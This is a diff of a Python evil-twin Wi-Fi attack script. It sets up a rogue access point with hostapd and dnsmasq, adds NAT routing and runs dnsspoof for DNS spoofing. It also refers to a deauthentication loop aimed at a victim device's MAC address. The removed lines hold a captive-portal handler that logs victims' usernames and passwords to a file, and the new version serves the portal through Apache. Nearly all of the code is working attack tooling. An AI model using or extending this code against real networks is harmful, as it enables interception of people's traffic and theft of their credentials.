@@ -4,77 +4,68 @@ from threading import Thread, Event
 import os
 from http.server import BaseHTTPRequestHandler, HTTPServer
 import urllib.parse
+from pathlib import Path
 
 # Event to stop deauth thread
 _deauth_stop = Event()
 
 
-def write_hostapd_conf(ap_iface, ssid, channel, path="hostapd.conf"):
-    content = f"""\
-interface={ap_iface}
-driver=nl80211
-ssid={ssid}
-channel={channel}
-hw_mode=g
-auth_algs=1
-ignore_broadcast_ssid=0
-"""
-    with open(path, 'w') as f:
-        f.write(content)
+def create_evil_ap(ap_info, ap_iface, uplink_iface="eth0", output_dir="."):
+    """
+    - ap_info: dict with keys 'SSID' and 'Channel'
+    - ap_iface: e.g. 'wlan0mon'
+    - uplink_iface: your internet‐connected interface, default 'eth0'
+    - output_dir: where to write hostapd.conf & dnsmasq.conf
+    """
 
-
-def write_dnsmasq_conf(ap_iface, path="dnsmasq.conf"):
-    content = f"""\
-interface={ap_iface}
-dhcp-range=10.0.0.10,10.0.0.100,12h
-dhcp-option=3,10.0.0.1 
-dhcp-option=6,10.0.0.1 
-address=/#/10.0.0.1 
-no-resolv
-server=8.8.8.8
-bind-interfaces
-"""
-    with open(path, 'w') as f:
-        f.write(content)
-
-
-def create_evil_ap(ap_info, ap_iface):
     ssid    = ap_info['SSID']
     channel = ap_info['Channel']
 
-    print("1) Stopping NetworkManager/other services…")
-    subprocess.run(['airmon-ng', 'check', 'kill'], check=False)
+    # 1) Load templates (in cwd)
+    hostapd_tmpl = Path("template_hostapd.conf").read_text()
+    dnsmasq_tmpl = Path("template_dnsmasq.conf").read_text()
 
-    # ensure ap_iface exists (via init.sh) and is up
-    subprocess.run(['ip', 'link', 'set', ap_iface, 'up'], check=True)
-
-    # assign IP to ap_iface (so dnsmasq will bind)
-    subprocess.run(['ip','addr','flush','dev',ap_iface], check=False)
-    subprocess.run(['ip','addr','add','10.0.0.1/24','dev',ap_iface], check=True)
-
-    # 3) Write configs
-    write_hostapd_conf(ap_iface, ssid, channel, path="hostapd.conf")
-    write_dnsmasq_conf(ap_iface, path="dnsmasq.conf")
-
-    # 4) Launch dnsmasq with that conf
-    print("4) Launching dnsmasq…")
-    subprocess.Popen(['dnsmasq', '-C', 'dnsmasq.conf'])
-
-    time.sleep(0.5)  # let DNS/DHCP settle
-
-    # 5) Launch hostapd as a daemon, log to hostapd.log
-    print("5) Launching hostapd (daemonized)…")
-    HOSTAPD = '/usr/bin/hostapd'  # use shutil.which('hostapd') if you like
-    logf = open('hostapd.log', 'w')
-    subprocess.Popen(
-        ['hostapd', '-B', '-dd', 'hostapd.conf'],
-        stdout=logf,
-        stderr=subprocess.STDOUT
+    # 2) Replace our placeholders
+    hostapd_conf = (
+        hostapd_tmpl
+        .replace("[INTERFACE NAME]", ap_iface)
+        .replace("[WIFI NAME]", ssid)
+        .replace("[CHANNEL NAME]", str(channel))
     )
-    logf.close()
-    print("  › hostapd started in background; see hostapd.log for details")
 
-    print(f"Evil Twin '{ssid}' should now be broadcasting on {ap_iface}.")
+    dnsmasq_conf = dnsmasq_tmpl.replace("[INTERFACE NAME]", ap_iface)
+
+    # 3) Write out the real configs
+    out_dir = Path(output_dir)
+    out_dir.mkdir(parents=True, exist_ok=True)
+    (out_dir / "hostapd.conf").write_text(hostapd_conf)
+    (out_dir / "dnsmasq.conf").write_text(dnsmasq_conf)
+    print(f"Written {out_dir/'hostapd.conf'} and {out_dir/'dnsmasq.conf'}")
+
+    cmds = [
+        # 4) Routing Table & Gateway
+        # assigns IP .1 to the monitor interface 
+        ["ifconfig", ap_iface, "up", "192.168.1.1", "netmask", "255.255.255.0"],
+        # ensures traffic for 192.168.1.x goes via .1
+        ["route", "add", "-net", "192.168.1.0", "netmask", "255.255.255.0", "gw", "192.168.1.1"],
+
+        # 5) Enabling Internet Access (NAT)
+        # NAT: masquerade outgoing traffic on eth0
+        ["iptables", "--table", "nat", "--append", "POSTROUTING",
+         "--out-interface", uplink_iface, "-j", "MASQUERADE"],
+        # allow forwarding from Wi‑Fi to Ethernet
+        ["iptables", "--append", "FORWARD",
+         "--in-interface", ap_iface, "-j", "ACCEPT"],
+
+        # enable IPv4 packet forwarding
+        ["sh", "-c", "echo 1 > /proc/sys/net/ipv4/ip_forward"],
+    ]
+
+    for cmd in cmds:
+        print("Running:", " ".join(cmd))
+        subprocess.run(cmd, check=True)
+
+    print("\nAP interface configured, NAT enabled.")
 
 
 def _deauth_loop(real_bssid, victim_mac, iface):
@@ -115,44 +106,54 @@ def deauth_victim(ap_info, victim_mac, iface):
     print(f"Deauth attack ended for {victim_mac}")
 
 
-def start_captive_portal(port=80):
+def start_captive_portal():
     """
-    Starts a simple captive portal on HTTP port 80 that captures credentials.
+    Starts Apache to serve the captive-portal pages.
     """
-    print("Starting captive portal...")
-    class PortalHandler(BaseHTTPRequestHandler):
-        def do_GET(self):
-            html = """
-            <html><body>
-              <h1>Wi-Fi Login Required</h1>
-              <form method="POST">
-                Username: <input name="username"><br>
-                Password: <input type="password" name="password"><br>
-                <input type="submit" value="Login">
-              </form>
-            </body></html>
-            """
-            self.send_response(200)
-            self.send_header('Content-Type', 'text/html')
-            self.end_headers()
-            self.wfile.write(html.encode())
+    try:
+        print("Starting Apache2 service for captive portal…")
+        subprocess.run(
+            ["service", "apache2", "start"],
+            check=True
+        )
+        print("Apache2 started successfully.")
+    except subprocess.CalledProcessError as e:
+        print(f"Failed to start Apache2: {e}")
 
-        def do_POST(self):
-            length = int(self.headers.get('Content-Length', 0))
-            body = self.rfile.read(length).decode()
-            data = urllib.parse.parse_qs(body)
-            username = data.get('username', [''])[0]
-            password = data.get('password', [''])[0]
-            # Log creds
-            with open('/tmp/credentials.txt', 'a') as f:
-                f.write(f"{username}:{password}\n")
-            print(f"Captured credentials: {username}:{password}")
-            # Acknowledge
-            self.send_response(200)
-            self.send_header('Content-Type', 'text/html')
-            self.end_headers()
-            self.wfile.write(b"<html><body><h1>Login successful!</h1></body></html>")
 
-    server = HTTPServer(('', port), PortalHandler)
-    print(f"Captive portal running on port {port}")
-    server.serve_forever()
+def start_attack(ap_iface,
+                 hostapd_conf="hostapd.conf",
+                 dnsmasq_conf="dnsmasq.conf"):
+    """
+    Launches the fake AP (hostapd), DHCP/DNS server (dnsmasq), and DNS spoofer (dnsspoof).
+    Returns the Popen handles so you can terminate them later if needed.
+    """
+    procs = {}
+    try:
+        print("Launching hostapd…")
+        procs['hostapd'] = subprocess.Popen(
+            ["hostapd", hostapd_conf]
+        )
+
+        print("Launching dnsmasq…")
+        procs['dnsmasq'] = subprocess.Popen(
+            ["dnsmasq", "-C", dnsmasq_conf, "-d"]
+        )
+
+        print(f"Launching dnsspoof on interface {ap_iface}…")
+        procs['dnsspoof'] = subprocess.Popen(
+            ["dnsspoof", "-i", ap_iface]
+        )
+
+        print("Attack started:")
+        for name, p in procs.items():
+            print(f"  • {name} (PID {p.pid})")
+
+    except Exception as e:
+        print(f"Error launching attack components: {e}")
+        # If something fails, clean up any started processes
+        for p in procs.values():
+            p.terminate()
+        raise
+
+    return procs
